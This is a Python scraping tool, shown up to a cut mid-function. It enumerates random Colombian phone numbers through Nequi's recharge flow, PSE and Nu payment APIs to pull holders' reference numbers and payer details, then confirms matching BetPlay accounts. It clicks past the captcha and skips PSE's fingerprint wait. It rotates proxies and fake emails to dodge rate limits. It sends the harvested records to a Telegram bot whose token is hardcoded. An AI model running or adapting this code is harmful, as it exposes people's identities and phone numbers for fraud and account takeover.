import asyncio
import json
import logging
import os
import random
import re
import sys
import time
import uuid
from collections import deque
from typing import Dict, Tuple, Optional

import aiohttp
from playwright.async_api import async_playwright

logging.basicConfig(level=logging.WARNING, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger("extractor")

# ======================================================================
#  CONFIGURACIÓN
# ======================================================================
USAR_PROXY      = False
MOSTRAR_VENTANA = False
SLOW_MO         = 250          # NO bajar: la secuencia del teclado lo necesita
ROTAR_SESION    = True
PAIS            = "co"
X_CUSTOM_VERSION = "4.0.71"

CONCURRENCIA = 7
LIMITE       = None

TELEGRAM_TOKEN   = "8005799410:AAGe720T8KDkwL9v32ldhMpWitHzANN3Wwk"
TELEGRAM_CHAT_ID = "1415509092"

CORREOS = []
NOMBRES = [
    "carlos", "juan", "andres", "david", "jose", "luis", "miguel", "angel",
    "kevin", "santiago", "sebastian", "daniel", "alejandro", "camilo", "felipe",
    "oscar", "julian", "brayan", "jeison", "maria", "laura", "andrea", "diana",
    "paula", "carolina", "valentina", "daniela", "juliana", "sara", "paola",
]
SUFIJOS = [
    "", "1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13",
    "21", "22", "23", "31", "77", "99", "123", "1234", "12345", "2020", "2021",
]
ARCHIVO_CORREO = "correo_actual.txt"

PREFIJOS_PESO = {
    "300": 6, "301": 5, "302": 4, "303": 4, "304": 4, "305": 4,
    "310": 6, "311": 6, "312": 6, "313": 6, "314": 6, "315": 6,
    "316": 6, "317": 6, "318": 6, "319": 6,
    "320": 5, "321": 5, "322": 5, "323": 4, "324": 3,
}
PREFIJOS_SET = set(PREFIJOS_PESO)

ARCHIVO_USADOS     = "celulares_usados.txt"
ARCHIVO_EXISTENTES = "existentes.txt"
ARCHIVO_NUMEROS    = "numeros_telegram.txt"
ARCHIVO_STATS      = "stats.json"

UA_BROWSER = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")

PROXIES = [
    {"server": "http://geo.iproyal.com:12321", "username": "TU_USUARIO", "password": "TU_PASSWORD"},
]

# ======================================================================
#  RETRY DNS
# ======================================================================
async def _goto_con_retry(page, url, intentos=3):
    for i in range(intentos):
        try:
            await page.goto(url, wait_until="domcontentloaded", timeout=60000)
            return True
        except Exception as e:
            if "ERR_NAME_NOT_RESOLVED" in str(e) and i < intentos - 1:
                print(f"[WARN] DNS falló, reintentando en {1.5*(i+1)}s...")
                await asyncio.sleep(1.5 * (i + 1))
                continue
            raise
    return False

# ======================================================================
#  CORREOS ROTATIVOS
# ======================================================================
_indice_correo = 0

def _lista_correos():
    global CORREOS
    if not CORREOS:
        for nombre in NOMBRES:
            for suf in SUFIJOS:
                CORREOS.append(f"{nombre}{suf}@gmail.com")
    return CORREOS

def correo_actual() -> str:
    lst = _lista_correos()
    return lst[_indice_correo % len(lst)]

def avanzar_correo() -> str:
    global _indice_correo
    _indice_correo += 1
    nuevo = correo_actual()
    try:
        with open(ARCHIVO_CORREO, "w", encoding="utf-8") as f:
            f.write(nuevo)
    except Exception:
        pass
    print(f"[i] Correo cambiado -> {nuevo}")
    return nuevo

def cargar_correo_guardado():
    global _indice_correo
    try:
        if os.path.exists(ARCHIVO_CORREO):
            with open(ARCHIVO_CORREO, encoding="utf-8") as f:
                guardado = f.read().strip()
            lst = _lista_correos()
            if guardado in lst:
                _indice_correo = lst.index(guardado) + 1
    except Exception:
        pass

# ======================================================================
#  CHECKER BETPLAY
# ======================================================================
HEADERS = {
    "accept": "application/json, text/plain, */*",
    "accept-language": "es-ES,es;q=0.9",
    "content-type": "application/json; charset=UTF-8",
    "origin": "https://betplay.com.co",
    "referer": "https://betplay.com.co/",
    "x-custom-version": X_CUSTOM_VERSION,
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.0.0 Safari/537.36",
    "sec-ch-ua": '"Google Chrome";v="155", "Chromium";v="155", "Not(A:Brand";v="24"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
}

class BetplayChecker:
    def __init__(self):
        self.session: Optional[aiohttp.ClientSession] = None

    async def init_session(self) -> bool:
        connector = aiohttp.TCPConnector(limit=200, limit_per_host=50,
                                         enable_cleanup_closed=True, ttl_dns_cache=300)
        self.session = aiohttp.ClientSession(
            headers=HEADERS, connector=connector,
            timeout=aiohttp.ClientTimeout(total=10, connect=5),
            cookie_jar=aiohttp.CookieJar(),
        )
        try:
            async with self.session.get("https://betplay.com.co/", ssl=True,
                                        timeout=aiohttp.ClientTimeout(total=5)) as resp:
                return resp.status == 200
        except Exception as e:
            logger.error(f"Error init betplay: {type(e).__name__}: {e}")
            return False

    async def close(self):
        if self.session and not self.session.closed:
            await self.session.close()

    async def verificar_documento(self, doc: str) -> Tuple[bool, Dict]:
        url = f"https://betplay.com.co/reverse-proxy/accounts/{doc}/forgotten-password-document-number"
        for intento in range(2):
            try:
                async with self.session.post(url, json={}, ssl=True,
                                             timeout=aiohttp.ClientTimeout(total=8)) as resp:
                    status = resp.status
                    try:
                        data = await resp.json()
                    except Exception:
                        data = {}
                    if status == 200:
                        if isinstance(data, dict) and data.get("code") == 505:
                            if intento == 0:
                                continue
                            return False, data
                        if data and any(v for v in data.values() if v):
                            return True, data
                        return False, data or {"message": "No registrado"}
                    if status == 404:
                        return False, {"message": "No registrado"}
                    if status == 429:
                        await asyncio.sleep(0.5)
                        continue
                    return False, {"status": status, "message": "Error HTTP"}
            except Exception:
                if intento == 1:
                    return False, {"error": "Max retries"}
                continue
        return False, {"error": "Max retries"}

# ======================================================================
#  MEMORIA / ESTADÍSTICAS
# ======================================================================
class Memoria:
    def __init__(self, ruta=ARCHIVO_STATS):
        self.ruta = ruta
        self.lock = asyncio.Lock()
        self.data = {"prefijos3": {}, "prefijos4": {}, "bloques": {},
                     "intentos": 0, "aciertos": 0}
        self._cargar()

    def _cargar(self):
        try:
            if os.path.exists(self.ruta):
                with open(self.ruta, encoding="utf-8") as f:
                    guardado = json.load(f)
                for k in self.data:
                    if k in guardado:
                        self.data[k] = guardado[k]
                print(f"[mem] Cargada: {len(self.data['bloques'])} bloques, "
                      f"{self.data['aciertos']} aciertos históricos")
        except Exception as e:
            print(f"[mem] Sin memoria previa: {e}")

    def _guardar_sync(self):
        try:
            with open(self.ruta, "w", encoding="utf-8") as f:
                json.dump(self.data, f, ensure_ascii=False, indent=1)
        except Exception:
            pass

    async def guardar_periodico(self):
        while True:
            await asyncio.sleep(30)
            async with self.lock:
                self._guardar_sync()

    async def registrar(self, celular, exito):
        async with self.lock:
            p3, p4, v = celular[:3], celular[:4], celular[:8]
            for d, clave in ((self.data["prefijos3"], p3), (self.data["prefijos4"], p4)):
                if clave not in d:
                    d[clave] = {"ok": 0, "fail": 0}
                if exito:
                    d[clave]["ok"] += 1
                else:
                    d[clave]["fail"] += 1
            if exito:
                if v not in self.data["bloques"]:
                    self.data["bloques"][v] = {"ok": 0}
                self.data["bloques"][v]["ok"] += 1
                self.data["bloques"][v]["ts"] = time.time()
            self.data["intentos"] += 1
            if exito:
                self.data["aciertos"] += 1

    def top_prefijos4(self, n=20):
        items = []
        for p4, d in self.data["prefijos4"].items():
            tot = d["ok"] + d["fail"]
            if tot >= 3:
                items.append((p4, d["ok"] / tot, d["ok"]))
        items.sort(key=lambda x: (x[1], x[2]), reverse=True)
        return items[:n]

    def bloques_calientes(self, n=30):
        ahora = time.time()
        items = []
        for v, d in self.data["bloques"].items():
            edad = ahora - d.get("ts", 0)
            peso = d["ok"] * (1.0 / (1.0 + edad / 3600.0))
            items.append((v, peso, d["ok"]))
        items.sort(key=lambda x: x[1], reverse=True)
        return items[:n]

    def tasa_acierto(self):
        if self.data["intentos"] == 0:
            return 0.0
        return self.data["aciertos"] / self.data["intentos"]

    def resumen(self):
        top = self.top_prefijos4(10)
        lineas = ["📈 <b>Estadísticas</b>",
                  f"Intentos: {self.data['intentos']}",
                  f"Aciertos: {self.data['aciertos']}",
                  f"Tasa: {self.tasa_acierto()*100:.2f}%", "",
                  "<b>Top prefijos4:</b>"]
        if not top:
            lineas.append("  (sin data suficiente)")
        for p4, tasa, ok in top:
            lineas.append(f"  <code>{p4}</code> — {ok} ok ({tasa*100:.0f}%)")
        return "\n".join(lineas)

mem = Memoria()

# ======================================================================
#  TELEGRAM
# ======================================================================
def contar_existentes() -> int:
    if not os.path.exists(ARCHIVO_EXISTENTES):
        return 0
    with open(ARCHIVO_EXISTENTES, encoding="utf-8") as f:
        return sum(1 for l in f if l.strip())

class Telegram:
    def __init__(self, token, chat_id=""):
        self.token = token
        self.chat_id = str(chat_id) if chat_id else ""
        self.session: Optional[aiohttp.ClientSession] = None
        self.offset = 0
        self.contador_msg_id = None
        self.activo = bool(token) and token != "PON_AQUI_TU_TOKEN"

    def url(self, method):
        return f"https://api.telegram.org/bot{self.token}/{method}"

    async def start(self):
        if not self.activo:
            return
        self.session = aiohttp.ClientSession()
        try:
            async with self.session.get(self.url("getUpdates"), params={"timeout": 0}) as r:
                data = await r.json()
            for upd in data.get("result", []):
                self.offset = upd["update_id"] + 1
        except Exception:
            pass

    async def cerrar(self):
        if self.session and not self.session.closed:
            await self.session.close()

    async def _api(self, method, params=None, files=None):
        if not self.activo or not self.session:
            return None
        try:
            if files:
                data = aiohttp.FormData()
                for k, v in (params or {}).items():
                    data.add_field(k, str(v))
                for k, (nombre, contenido) in files.items():
                    data.add_field(k, contenido, filename=nombre)
                async with self.session.post(self.url(method), data=data) as r:
                    return await r.json()
            else:
                async with self.session.post(self.url(method), json=params or {}) as r:
                    return await r.json()
        except Exception as e:
            logger.error(f"telegram {method}: {type(e).__name__}: {e}")
            return None

    async def enviar(self, texto, chat_id=None):
        cid = chat_id or self.chat_id
        if not cid:
            return None
        res = await self._api("sendMessage", {"chat_id": cid, "text": texto, "parse_mode": "HTML"})
        if res and res.get("ok"):
            return res["result"]["message_id"]
        return None

    async def editar(self, msg_id, texto):
        if not self.chat_id:
            return
        await self._api("editMessageText", {"chat_id": self.chat_id,
                                            "message_id": msg_id, "text": texto})

    async def enviar_documento(self, ruta, caption="", chat_id=None):
        cid = chat_id or self.chat_id
        if not cid or not os.path.exists(ruta):
            return
        with open(ruta, "rb") as f:
            contenido = f.read()
        await self._api("sendDocument", {"chat_id": cid, "caption": caption},
                        files={"document": (os.path.basename(ruta), contenido)})

    async def actualizar_contador(self):
        if not self.activo or not self.chat_id:
            return
        texto = (f"📊 <b>Cuentas guardadas:</b> {contar_existentes()}\n"
                 f"🎯 Tasa: {mem.tasa_acierto()*100:.2f}%")
        if self.contador_msg_id:
            await self.editar(self.contador_msg_id, texto)
        else:
            self.contador_msg_id = await self.enviar(texto)

    async def notificar_guardado(self, celular, referencia, nombre=""):
        extra = f"\n👤 {nombre}" if nombre else ""
        await self.enviar(f"✅ Nueva cuenta\n📄 Ref: <code>{referencia}</code>\n"
                          f"📱 {celular}{extra}\n📊 Total: {contar_existentes()}")
        await self.actualizar_contador()

    async def procesar_update(self, upd):
        msg = upd.get("message") or {}
        texto = (msg.get("text") or "").strip()
        chat_id = str((msg.get("chat") or {}).get("id", ""))
        if not texto or not chat_id:
            return
        if not self.chat_id:
            self.chat_id = chat_id
        cmd = texto.split()[0].split("@")[0].lower()

        if cmd in ("/start", "/ayuda", "/help"):
            await self.enviar(
                "🤖 <b>Bot extractor</b>\n\n"
                "/contador — cuentas guardadas\n"
                "/descargar — descarga existentes.txt\n"
                "/numeros — celulares en formato +57\n"
                "/correo — correo actual\n"
                "/stats — tasa de acierto\n"
                "/top — mejores prefijos aprendidos\n"
                "/bloques — bloques calientes\n"
                "/reset_stats — borrar aprendizaje\n", chat_id=chat_id)
        elif cmd == "/contador":
            await self.enviar(f"📊 Cuentas guardadas: <b>{contar_existentes()}</b>", chat_id=chat_id)
        elif cmd == "/correo":
            await self.enviar(f"📧 Correo actual: <code>{correo_actual()}</code>", chat_id=chat_id)
        elif cmd == "/descargar":
            if os.path.exists(ARCHIVO_EXISTENTES):
                await self.enviar_documento(ARCHIVO_EXISTENTES,
                    caption=f"existentes.txt ({contar_existentes()} registros)", chat_id=chat_id)
            else:
                await self.enviar("Aún no hay existentes.txt", chat_id=chat_id)
        elif cmd == "/numeros":
            n = generar_archivo_numeros()
            if n:
                await self.enviar_documento(ARCHIVO_NUMEROS,
                    caption=f"{n} números en formato 57", chat_id=chat_id)
            else:
                await self.enviar("Aún no hay números", chat_id=chat_id)
        elif cmd == "/stats":
            await self.enviar(mem.resumen(), chat_id=chat_id)
        elif cmd == "/top":
            top = mem.top_prefijos4(20)
            if not top:
                await self.enviar("Sin data suficiente todavía", chat_id=chat_id)
            else:
                lineas = ["🏆 <b>Top prefijos</b>"]
                for p4, tasa, ok in top:
                    lineas.append(f"<code>{p4}</code> — {ok} ok — {tasa*100:.1f}%")
                await self.enviar("\n".join(lineas), chat_id=chat_id)
        elif cmd == "/bloques":
            cal = mem.bloques_calientes(20)
            if not cal:
                await self.enviar("Sin bloques calientes todavía", chat_id=chat_id)
            else:
                lineas = ["🔥 <b>Bloques calientes</b>"]
                for v, peso, ok in cal:
                    lineas.append(f"<code>{v}XX</code> — {ok} ok")
                await self.enviar("\n".join(lineas), chat_id=chat_id)
        elif cmd == "/reset_stats":
            mem.data = {"prefijos3": {}, "prefijos4": {}, "bloques": {},
                        "intentos": 0, "aciertos": 0}
            mem._guardar_sync()
            await self.enviar("♻️ Aprendizaje reseteado", chat_id=chat_id)
        else:
            await self.enviar("Comando no reconocido. Usa /ayuda", chat_id=chat_id)

    async def poll(self):
        if not self.activo:
            return
        while True:
            try:
                async with self.session.get(self.url("getUpdates"),
                                            params={"timeout": 30, "offset": self.offset},
                                            timeout=aiohttp.ClientTimeout(total=40)) as r:
                    data = await r.json()
                for upd in data.get("result", []):
                    self.offset = upd["update_id"] + 1
                    await self.procesar_update(upd)
            except Exception:
                await asyncio.sleep(2)

def generar_archivo_numeros() -> int:
    if not os.path.exists(ARCHIVO_EXISTENTES):
        return 0
    nums = []
    with open(ARCHIVO_EXISTENTES, encoding="utf-8") as f:
        for linea in f:
            linea = linea.strip()
            if not linea:
                continue
            partes = [p.strip() for p in linea.split("|")]
            celular = partes[1] if len(partes) > 1 else (partes[-1] if partes else "")
            d = re.sub(r"\D", "", celular)
            if len(d) >= 10:
                nums.append("57" + d[-10:])
    with open(ARCHIVO_NUMEROS, "w", encoding="utf-8") as f:
        f.write("\n".join(nums))
    return len(nums)

tg = Telegram(TELEGRAM_TOKEN, TELEGRAM_CHAT_ID)

# ======================================================================
#  PROXIES
# ======================================================================
def cargar_proxies():
    if PROXIES:
        return PROXIES
    ruta = os.path.join(os.path.dirname(os.path.abspath(__file__)), "proxies.txt")
    lista = []
    if os.path.exists(ruta):
        with open(ruta, encoding="utf-8") as f:
            for linea in f:
                linea = linea.strip()
                if not linea or linea.startswith("#"):
                    continue
                p = linea.split(":")
                if len(p) == 4:
                    host, port, user, pw = p
                    lista.append({"server": f"http://{host}:{port}", "username": user, "password": pw})
                elif len(p) == 2:
                    host, port = p
                    lista.append({"server": f"http://{host}:{port}"})
    return lista

def preparar_proxy(proxy):
    if not proxy:
        return None
    px = dict(proxy)
    if ROTAR_SESION and px.get("username") and px.get("password"):
        sid = uuid.uuid4().hex[:10]
        if f"_country-{PAIS}" not in px["password"]:
            px["password"] = px["password"] + f"_country-{PAIS}_session-{sid}_lifetime-10m"
        else:
            px["password"] = px["password"] + f"_session-{sid}"
    return px

# ======================================================================
#  GENERACIÓN INTELIGENTE (BLOQUES DE ORO + DIVERSIDAD)
# ======================================================================
_pila_vecinos = deque()
_usados_cache = None

def _usados():
    global _usados_cache
    if _usados_cache is None:
        _usados_cache = set()
        if os.path.exists(ARCHIVO_USADOS):
            with open(ARCHIVO_USADOS, encoding="utf-8") as f:
                _usados_cache = {l.strip() for l in f if l.strip()}
    return _usados_cache

def _marcar_usado(n):
    _usados().add(n)
    with open(ARCHIVO_USADOS, "a", encoding="utf-8") as f:
        f.write(n + "\n")

def _valido(s):
    return s[:3] in PREFIJOS_SET and s not in _usados()

def _prefijo_aprendido():
    top = mem.top_prefijos4(20)
    if not top:
        return None
    pesos = [max(t * (ok ** 0.5), 0.01) for _, t, ok in top]
    return random.choices(top, weights=pesos)[0][0]

def generar_aleatorio():
    p4 = _prefijo_aprendido()
    if p4 and random.random() < 0.3:   # solo 30% memoria -> diversidad
        return p4 + "".join(random.choice("0123456789") for _ in range(6))
    pref = random.choices(list(PREFIJOS_PESO), weights=list(PREFIJOS_PESO.values()))[0]
    return pref + "".join(random.choice("0123456789") for _ in range(7))

PUENTES = {"300": ("301", "310"), "301": ("300", "310"), "310": ("311", "313"),
           "311": ("310", "312"), "312": ("311", "313"), "313": ("312", "314"),
           "314": ("313", "315"), "315": ("314", "316"), "316": ("315", "317"),
           "317": ("316", "318"), "318": ("317", "319"), "319": ("318", "320"),
           "320": ("319", "321"), "321": ("320", "322"), "322": ("321", "323"),
           "323": ("322", "324"), "324": ("323",)}

def agregar_vecinos(celular):
    base = int(celular)
    pref3 = celular[:3]
    orden = []
    for d in range(60):
        orden.append(base + d)
    for d in (10, 20, 50, 100):
        orden.append(base + d)
        orden.append(base - d)
    for pref in PUENTES.get(pref3, ()):
        for _ in range(5):
            orden.append(int(pref + "".join(random.choices("0123456789", k=7))))
    vistos = set(_pila_vecinos)
    for n in reversed(orden):
        s = str(n).zfill(10)
        if _valido(s) and s not in vistos:
            _pila_vecinos.appendleft(s)
            vistos.add(s)

def _sembrar_desde_memoria():
    calientes = mem.bloques_calientes(20)
    for v, _, _ in calientes:
        base = int(v + "00")
        for d in range(0, 100, 7):
            s = str(base + d).zfill(10)
            if _valido(s) and s not in _pila_vecinos:
                _pila_vecinos.append(s)
    if calientes:
        print(f"[mem] Sembrados vecinos de {len(calientes)} bloques calientes")

def siguiente_celular():
    while _pila_vecinos:
        c = _pila_vecinos.popleft()
        if _valido(c):
            _marcar_usado(c)
            return c
    while True:
        c = generar_aleatorio()
        if _valido(c):
            _marcar_usado(c)
            return c

# ======================================================================
#  HELPERS DE NAVEGACIÓN
# ======================================================================
async def leer_texto(page):
    partes = []
    for fr in page.frames:
        try:
            partes.append(await fr.evaluate("() => document.body ? document.body.innerText : ''"))
        except Exception:
            pass
    return "\n".join(partes)

async def clic_si_existe(page, texto, timeout=4000):
    try:
        b = page.locator(f'button:has-text("{texto}")').first
        await b.wait_for(state="visible", timeout=timeout)
        await b.click(force=True)
        return True
    except Exception:
        return False

async def clic_inmediato(page, texto, timeout=8000):
    try:
        b = page.locator(f'button:has-text("{texto}")').first
        await b.wait_for(state="visible", timeout=timeout)
        await b.click(force=True)
        return True
    except Exception:
        return False

async def texto_modal(page):
    for fr in page.frames:
        try:
            loc = fr.locator('.modal__content-message')
            if await loc.count() > 0:
                return (await loc.first.inner_text()).strip().lower()
        except Exception:
            pass
    return ""

def clasificar_modal(msg):
    if "no tiene una cuenta" in msg:
        return "sin_cuenta"
    if "no fue posible hacer la recarga" in msg or "vuelve a intentar" in msg:
        return "sin_cuenta"
    if "30 minutos" in msg or "límite" in msg:
        return "bloqueo"
    return "sin_cuenta"

async def resolver_paso_nequi(page, context, timeout=25000):
    fin = asyncio.get_event_loop().time() + timeout / 1000
    ya_recargo = False
    while asyncio.get_event_loop().time() < fin:
        msg = await texto_modal(page)
        if msg:
            return clasificar_modal(msg)
        try:
            if "pse.com.co" in page.url:
                return "ok"
        except Exception:
            pass
        try:
            if len(context.pages) > 1:
                return "ok"
        except Exception:
            pass
        if not ya_recargo:
            try:
                btn = page.locator('button:has-text("Recargar")').first
                if await btn.is_visible():
                    await btn.click(force=True)
                    ya_recargo = True
                    await page.wait_for_timeout(400)
                    continue
            except Exception:
                pass
        await page.wait_for_timeout(250)
    return "timeout"

# ======================================================================
#  JS NATIVO DE PSE (usa las funciones de la propia página)
# ======================================================================
JS_PSE_RAPIDO = """
async (correo) => {
    // 1. esperar a que prefs cargue (resultado de GetPreferences)
    for (let i = 0; i < 40; i++) {
        if (window.prefs) break;
        await new Promise(r => setTimeout(r, 250));
    }
    if (!window.prefs) return {ok: false, error: 'prefs no cargadas'};

    // 2. saltar el modal de resumen si está visible
    try {
        const modal = document.getElementById('transactionSummaryModal');
        const btn = document.getElementById('btnTransactionSummaryContinue');
        if (modal && btn && !modal.hidden) {
            btn.click();
        } else if (typeof continueStartTransactionFlow === 'function') {
            continueStartTransactionFlow();
        }
    } catch (e) {}

    await new Promise(r => setTimeout(r, 800));

    // 3. si hay sesión de usuario registrada, redirige solo
    if (window.prefs.AuthName && window.prefs.AuthName.length > 0) {
        return {ok: true, path: 'session'};
    }

    // 4. llenar el correo
    const el = document.getElementById('PNEMail');
    if (el) {
        el.value = correo;
        el.dispatchEvent(new Event('input', {bubbles: true}));
        el.dispatchEvent(new Event('keyup', {bubbles: true}));
    }

    // 5. disparar el flujo NATIVO sin la espera de 10s del fingerprint
    try {
        if (typeof loadRegisterAndChooseQuestion === 'function') {
            loadRegisterAndChooseQuestion();
            await new Promise(r => setTimeout(r, 1500));
            if (window.userdata && window.userdata.Success) {
                window.userquestionanswer = {Success: true, EnableWithoutRegister: false};
                if (typeof redirectToBank === 'function') {
                    redirectToBank(false);   // false = SIN espera de fingerprint
                    return {ok: true, path: 'api'};
                }
            }
        }
    } catch (e) {}

    // 6. fallback: clic en el botón real
    const btnSeguir = document.getElementById('btnSeguir') || document.getElementById('btnSeguir2');
    if (btnSeguir) { btnSeguir.click(); return {ok: true, path: 'click'}; }
    return {ok: false, error: 'no se pudo disparar el flujo'};
}
"""

JS_NU_DETALLES = """
async (authId) => {
    const r = await fetch('https://prod-global-global-hadou.prod-waf.nu.com.co/api/authorization/details-web', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({id: authId})
    });
    return await r.json();
}
"""

JS_NU_CANCELAR = """
async (authId) => {
    const r = await fetch('https://prod-global-global-hadou.prod-waf.nu.com.co/api/cancel-payment-web', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({'authorization-id': authId})
    });
    return await r.json();
}
"""

def _buscar_valor(obj, claves):
    if isinstance(obj, dict):
        for k, v in obj.items():
            if k in claves and isinstance(v, (str, int)) and str(v).strip():
                return str(v)
            r = _buscar_valor(v, claves)
            if r:
                return r
    elif isinstance(obj, list):
        for v in obj:
            r = _buscar_valor(v, claves)
            if r:
                return r
    return None

# ======================================================================
#  NU FALLBACK (aiohttp, por si el fetch interno falla)
# ======================================================================
NU_HADOU = "https://prod-global-global-hadou.prod-waf.nu.com.co/api"

async def nu_api_procesar(auth_id: str) -> Optional[Dict]:
    session = aiohttp.ClientSession(
        timeout=aiohttp.ClientTimeout(total=20),
        headers={"user-agent": UA_BROWSER,
                 "accept": "application/json",
                 "content-type": "application/json",
                 "origin": "https://pagos.nu.com.co",
                 "referer": "https://pagos.nu.com.co/"})
    try:
        async with session.post(f"{NU_HADOU}/authorization/details-web",
                                json={"id": auth_id}) as r:
            detalles = await r.json(content_type=None)
        ref3 = _buscar_valor(detalles, ("ref3",))
        try:
            payer = detalles["authorization"]["authorization_request"]\
                          ["liquidation_method"]["options"]["payer"]
        except Exception:
            payer = {}
        try:
            async with session.post(f"{NU_HADOU}/cancel-payment-web",
                                    json={"authorization-id": auth_id}) as r:
                await r.read()
        except Exception:
            pass
        if ref3:
            return {"ref3": ref3, "payer": payer if isinstance(payer, dict) else {}}
        return None
    except Exception as e:
        print(f"[api-nu] Error: {type(e).__name__}: {e}")
        return None
    finally:
        await session.close()

# ======================================================================
#  BETPLAY: verificar y guardar
# ======================================================================
def buscar_campo(data, claves):
    if isinstance(data, dict):
        for k, v in data.items():
            if isinstance(v, (str, int)) and any(c in str(k).lower() for c in claves) and str(v).strip():
                return str(v)
        for v in data.values():
            r = buscar_campo(v, claves)
            if r:
                return r
    elif isinstance(data, list):
        for v in data:
            r = buscar_campo(v, claves)
            if r:
                return r
    return ""

def telefono_coincide(celular: str, tel_betplay: str) -> bool:
    tel_digits = re.sub(r"\D", "", str(tel_betplay))
    if len(tel_digits) < 6:
        return False
    return tel_digits[:3] == celular[:3] and tel_digits[-3:] == celular[-3:]

async def chequear_y_guardar(celular, referencia, nombre="", cedula=""):
    print(f"[?] Probando referencia {referencia} en BetPlay...")
    checker = BetplayChecker()
    if not await checker.init_session():
        print("[!] No se pudo conectar a BetPlay")
        return False
    try:
        valido, datos = await checker.verificar_documento(referencia)
        print(f"[i] JSON BetPlay: {json.dumps(datos, ensure_ascii=False)[:400]}")
        if not valido:
            print(f"[NO] referencia {referencia} no registrada en BetPlay")
            return False
        tel = buscar_campo(datos, ("phone", "cel", "tel", "movil", "mobile"))
        if not tel:
            print(f"[~] ref {referencia} registrada pero sin teléfono en el JSON")
            return False
        if telefono_coincide(celular, tel):
            with open(ARCHIVO_EXISTENTES, "a", encoding="utf-8") as f:
                f.write(f"{referencia} | {celular}\n")
            print(f"[EXISTENTE] ref {referencia} -> {celular} GUARDADO")
            await tg.notificar_guardado(celular, referencia)
            return True
        else:
            print(f"[~] ref {referencia} existe pero teléfono no coincide (tel {tel})")
            return False
    finally:
        await checker.close()

# ======================================================================
#  FLUJO PRINCIPAL
# ======================================================================
async def _buscar_pagina(context, patron):
    for pg in context.pages:
        try:
            if patron in pg.url:
                return pg
        except Exception:
            pass
    return None

async def _esperar_pagina(context, patron, timeout=30):
    fin = asyncio.get_event_loop().time() + timeout
    while asyncio.get_event_loop().time() < fin:
        pg = await _buscar_pagina(context, patron)
        if pg:
            return pg
        await asyncio.sleep(0.3)
    return None

async def ejecutar(celular, proxy=None):
    """'ok' | 'sin_cuenta' | 'bloqueo' | 'sin_ref' | 'correo_agotado' | 'error'"""
    proxy = preparar_proxy(proxy)
    correo = correo_actual()
    capturado = {"put": None}

    async with async_playwright() as p:
        browser = await p.chromium.launch(
            headless=not MOSTRAR_VENTANA, slow_mo=SLOW_MO, proxy=proxy)
        context = await browser.new_context(
            viewport={'width': 1280, 'height': 900}, user_agent=UA_BROWSER)
        page = await context.new_page()

        await page.route("**/*", lambda route:
            route.abort() if route.request.resource_type in ["image", "font", "media"]
            else route.continue_())

        async def _on_response(resp):
            try:
                if "cashin-orchestrator" in resp.url and resp.request.method == "PUT":
                    capturado["put"] = await resp.json()
            except Exception:
                pass

        page.on("response", lambda r: asyncio.ensure_future(_on_response(r)))

        try:
            print(f"[*] Procesando {celular} (correo {correo})...")
            await _goto_con_retry(page, "https://clientes.nequi.com.co/recargas")

            await page.wait_for_selector('input#phoneNumber', timeout=25000)
            await page.locator('input#phoneNumber').fill(celular)
            await page.locator('input#confirmPhoneNumber').fill(celular)
            await page.locator('input#transactionValue').fill("1000")

            await page.keyboard.press("Tab")
            await page.keyboard.press("Tab")
            await page.keyboard.press("Enter")
            await page.keyboard.type("Nu", delay=120)
            await page.keyboard.press("Enter")
            await page.keyboard.press("Tab")

            try:
                captcha = page.locator('.mosparo__checkbox')
                await captcha.wait_for(state="visible", timeout=12000)
                await captcha.click(force=True)
            except Exception:
                pass

            await clic_inmediato(page, "Continuar", timeout=10000)

            resultado = await resolver_paso_nequi(page, context, timeout=25000)

            if resultado == "sin_cuenta":
                print(f"[!] {celular} marcado como NO existente -> siguiente")
                await clic_si_existe(page, "Continuar", timeout=3000)
                return "sin_cuenta"
            if resultado == "bloqueo":
                print(f"[!] Bloqueo Nequi {celular}")
                return "bloqueo"
            if resultado == "timeout":
                print(f"[!] {celular} sin respuesta clara -> siguiente")
                return "error"

            # ---- PUT completo (diagnóstico del veredicto de Nequi) ----
            for _ in range(20):
                if capturado["put"] is not None:
                    break
                await page.wait_for_timeout(250)
            if capturado["put"] is not None:
                print(f"[i] PUT COMPLETO: "
                      f"{json.dumps(capturado['put'], ensure_ascii=False)}")

            # ---- esperar página de PSE ----
            page_pse = await _esperar_pagina(context, "pse.com.co", timeout=30)
            if not page_pse:
                print(f"[!] No llegó a PSE para {celular}")
                return "sin_ref"

            m = re.search(r'[?&]enc=([^&]+)', page_pse.url)
            if not m:
                print("[!] PSE sin enc en la URL")
                return "sin_ref"
            print(f"[OK] Llegó a PSE, enc capturado ({len(m.group(1))} chars)")

            # ---- PSE ACELERADO: funciones nativas de la página ----
            try:
                res_eval = await page_pse.evaluate(JS_PSE_RAPIDO, correo)
                print(f"[i] PSE evaluate: {res_eval}")
            except Exception as e:
                print(f"[i] PSE evaluate falló ({type(e).__name__}) -> clics clásicos")
                await clic_inmediato(page_pse, "Continuar", timeout=10000)
                try:
                    await page_pse.locator('input#PNEMail').fill(correo)
                except Exception:
                    try:
                        await page_pse.locator('input[placeholder*="correo"]').first.fill(correo)
                    except Exception:
                        pass
                await clic_inmediato(page_pse, "Ir al Banco", timeout=10000)

            # ---- esperar página de Nu ----
            page_nu = await _esperar_pagina(context, "autorizacion-pse", timeout=40)

            if not page_nu:
                # ¿fue error de CUS (correo agotado)?
                try:
                    texto = (await leer_texto(page_pse)).lower()
                    if "codigo unico (cus)" in texto or "código único (cus)" in texto \
                       or "no se pudo realizar" in texto:
                        print(f"[!] CUS: correo {correo} agotado -> cambio")
                        avanzar_correo()
                        return "correo_agotado"
                except Exception:
                    pass
                print(f"[!] Nu nunca llegó para {celular}")
                return "sin_ref"

            # ---- Nu: id de la URL + fetch interno ----
            m = re.search(r"[?&]id=([a-f0-9\-]{20,50})", page_nu.url)
            if not m:
                print(f"[!] Nu sin id en URL: {page_nu.url[:80]}")
                return "sin_ref"
            auth_id = m.group(1)

            datos = None
